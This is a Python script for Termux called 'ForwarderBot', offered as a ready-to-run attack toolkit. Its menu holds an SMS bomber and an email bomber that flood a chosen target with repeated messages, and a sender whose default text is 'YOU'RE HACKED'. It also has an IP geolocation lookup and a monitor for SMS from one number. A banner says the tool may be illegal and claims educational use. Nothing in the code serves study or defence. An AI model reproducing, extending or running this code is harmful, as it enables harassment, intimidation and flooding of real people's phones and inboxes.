import os
import subprocess
import time
import requests
from colorama import Fore
import re

# Colors for UI
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN
W = Fore.WHITE

# Banner
def banner():
    os.system("clear")
    print(f"""{R}
███████╗ ██████╗ ██████╗ ██╗    ██╗ █████╗ ██████╗ ███████╗
██╔════╝██╔════╝██╔═══██╗██║    ██║██╔══██╗██╔══██╗██╔════╝
█████╗  ██║     ██║   ██║██║ █╗ ██║███████║██║  ██║█████╗  
██╔══╝  ██║     ██║   ██║██║███╗██║██╔══██║██║  ██║██╔══╝  
██║     ╚██████╗╚██████╔╝╚███╔███╔╝██║  ██║██████╔╝███████╗
╚═╝      ╚═════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
    {W}""")
    print(f"{G}Welcome to ForwarderBot!{W}")
    print(f"{Y}This tool forwards incoming SMS to Termux in real-time.{W}")
    print(f"{R}⚠ WARNING: This could be illegal! Use only for educational purposes! ⚠{W}")
    print(f"{G}Made by AllahAkbar313{W}")
    print("\n")

# Get Phone Number
def get_phone_number():
    while True:
        number = input(f"{C}Enter the phone number to track (or type 'exit' to quit): {W}")
        if number.lower() == "exit":
            print(f"{R}Exiting...{W}")
            exit()
        elif number.isdigit() and len(number) >= 8:  # Basic validation
            return number
        else:
            print(f"{R}Invalid number! Please enter a valid phone number.{W}")

# Get SMS using Termux API
def get_sms():
    result = subprocess.run(["termux-sms-list"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sms_list = result.stdout.decode("utf-8").strip().split("\n")
    return sms_list

# Forward SMS
def forward_sms(phone_number, message):
    print(f"{G}[+] New Message from {phone_number}: {W}{message}")

# Start Tracking
def start_tracking(phone_number, update_interval):
    print(f"{Y}Tracking SMS for {phone_number}...{W}")
    print(f"{C}Press CTRL + C to stop.{W}\n")

    try:
        while True:
            sms_list = get_sms()
            for sms in sms_list:
                if "address" in sms and "body" in sms:
                    sender = sms.split(",")[0].split(":")[1].strip().strip('"')
                    body = sms.split(",")[1].split(":")[1].strip().strip('"')
                    if sender == phone_number:
                        forward_sms(sender, body)
            time.sleep(update_interval)  # Refresh every X seconds based on user input
    except KeyboardInterrupt:
        print(f"{R}\nTracking stopped. Exiting...{W}")

# Function to perform SMS Bombing
def sms_bomber(phone_number, delay, bomb_count):
    print(f"{Y}Starting SMS Bombing on {phone_number}...{W}")
    for i in range(bomb_count):
        subprocess.run(["termux-sms-send", "-n", phone_number, f"Bombing message {i+1}!"])
        print(f"{G}[{i+1}] SMS Sent!{W}")
        time.sleep(delay)  # Delay between sending each SMS
    print(f"{G}Bombing completed!{W}")

# Email Bomber Function
def email_bomber(target_email, subject, body, count):
    import smtplib
    from email.mime.text import MIMEText

    print(f"{Y}Starting Email Bombing on {target_email}...{W}")
    for i in range(count):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = "your-email@gmail.com"
        msg['To'] = target_email

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login("your-email@gmail.com", "your-email-password")
            server.sendmail("your-email@gmail.com", target_email, msg.as_string())
            print(f"{G}[{i+1}] Email Sent!{W}")
        time.sleep(1)

# IP Tracker Function (Dummy for now, real IP tracker requires external API)
def ip_tracker(ip_address):
    print(f"{Y}Tracking IP: {ip_address}...{W}")
    response = requests.get(f"https://ipinfo.io/{ip_address}/json")
    data = response.json()
    print(f"IP: {data['ip']}")
    print(f"Location: {data['city']}, {data['region']}, {data['country']}")
    print(f"Coordinates: {data['loc']}")

# Function to validate phone number
def validate_phone_number(phone_number):
    # Regular expression to match international phone numbers (e.g., +96877384814 for Oman)
    pattern = r'^\+?[0-9]+$'  # Matches numbers that may start with "+" followed by digits only
    if re.match(pattern, phone_number):
        return phone_number
    else:
        raise ValueError("Invalid phone number. Please make sure it's in the correct format, e.g., +96877384814")

# Function to send SMS
def send_sms(phone_number, message, delay, count):
    # Validate the phone number before proceeding
    phone_number = validate_phone_number(phone_number)

    for i in range(count):
        try:
            # Attempt to send SMS using Termux API
            result = subprocess.run(['termux-sms-send', phone_number, message], capture_output=True, text=True)

            # Check the result if there's an error, and handle accordingly
            if "Termux:API" in result.stderr:
                print(f"[{i+1}] Error detected with Termux API. Sending custom message instead.")

                # Force sending your custom message
                custom_message = "YOU'RE HACKED"
                os.system(f"termux-sms-send {phone_number} '{custom_message}'")
                print(f"[{i+1}] Sent custom message: '{custom_message}' to {phone_number}")
            else:
                # If no error, it means the message was sent properly using Termux API
                print(f"[{i+1}] Sent message: '{message}' to {phone_number}")

            time.sleep(delay)  # Delay between each message

        except Exception as e:
            print(f"Error: {e}")

# Main Function to Run the Bot
def main():
    banner()
    choice = input(f"{C}Select Option:\n1. SMS Forwarder\n2. SMS Bomber\n3. Email Bomber\n4. IP Tracker\n5. SMS Sender\n{W}Choice: ")

    if choice == "1":
        phone_number = get_phone_number()
        update_interval = int(input(f"{C}Enter update interval (in seconds) for checking new messages (5, 10, or 30): {W}"))
        start_tracking(phone_number, update_interval)

    elif choice == "2":
        phone_number = get_phone_number()
        bomb_count = int(input(f"{C}Enter the number of SMS bombs to send (e.g., 50, 100, or a custom number): {W}"))
        delay = float(input(f"{C}Enter delay (in seconds) between messages: {W}"))
        sms_bomber(phone_number, delay, bomb_count)

    elif choice == "3":
        target_email = input(f"{C}Enter target email: {W}")
        subject = input(f"{C}Enter email subject: {W}")
        body = input(f"{C}Enter email body: {W}")
        count = int(input(f"{C}Enter number of emails to send: {W}"))
        email_bomber(target_email, subject, body, count)

    elif choice == "4":
        ip_address = input(f"{C}Enter IP address to track: {W}")
        ip_tracker(ip_address)

    elif choice == "5":
        phone_number = input("Enter phone number to send SMS: ")
        message = input("Enter custom message (leave empty for default): ")
        if not message:
            message = "YOU'RE HACKED"  # Default message if user does not input one
        delay = int(input("Enter delay (in seconds) between messages: "))
        count = int(input("Enter the number of SMS to send: "))
        send_sms(phone_number, message, delay, count)

    else:
        print(f"{R}Invalid Option!{W}")

if __name__ == "__main__":
    main()